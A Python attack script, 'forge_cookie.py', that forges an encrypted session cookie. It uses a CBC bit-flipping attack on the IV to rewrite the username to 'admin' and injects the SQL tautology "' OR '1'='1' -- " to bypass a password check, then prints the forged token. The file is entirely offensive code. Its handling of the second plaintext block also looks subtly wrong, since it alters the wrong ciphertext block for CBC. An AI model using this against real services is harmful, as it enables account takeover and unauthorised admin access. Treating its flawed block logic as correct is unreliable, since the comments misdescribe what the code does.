#!/usr/bin/env python3
import sys
import hashlib

def xor_bytes(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))

def main():
    if len(sys.argv) != 4:
        print("Usage: forge_cookie.py <username> <password> <session_hex>")
        sys.exit(1)

    username = sys.argv[1]
    password = sys.argv[2]
    session_hex = sys.argv[3].strip()

    raw = bytes.fromhex(session_hex)
    if len(raw) < 48:
        print("Error: session too short")
        sys.exit(2)

    iv = raw[:16]
    c1 = raw[16:32]   # ciphertext block for P0
    c2 = raw[32:48]   # ciphertext block for P1
    rest = raw[48:]

    # Ensure provided username is at least 6 chars to align block boundary
    username6 = (username[:6]).encode('utf-8')
    if len(username6) < 6:
        print("Error: username must be at least 6 chars")
        sys.exit(3)

    # P0 original and target
    p0_orig = b"user/pass:" + username6  # 16 bytes
    if len(p0_orig) != 16:
        print("Error: unexpected p0 length")
        sys.exit(4)
    p0_target = b"user/pass:admin/"      # 16 bytes
    new_iv = xor_bytes(iv, xor_bytes(p0_orig, p0_target))

    # P1 original when we moved '/' into P0: now first 16 chars of md5 hex
    md5_hex = hashlib.md5(password.encode('utf-8')).hexdigest().encode('ascii')
    p1_orig = md5_hex[:16]
    if len(p1_orig) != 16:
        print("Error: unexpected p1 length")
        sys.exit(5)

    # Inject SQL true condition and comment to bypass password check
    p1_target = b"' OR '1'='1' -- "  # 16 bytes
    new_c2 = xor_bytes(c2, xor_bytes(p1_orig, p1_target))

    forged = new_iv + c1 + new_c2 + rest
    print(forged.hex())

if __name__ == "__main__":
    main()

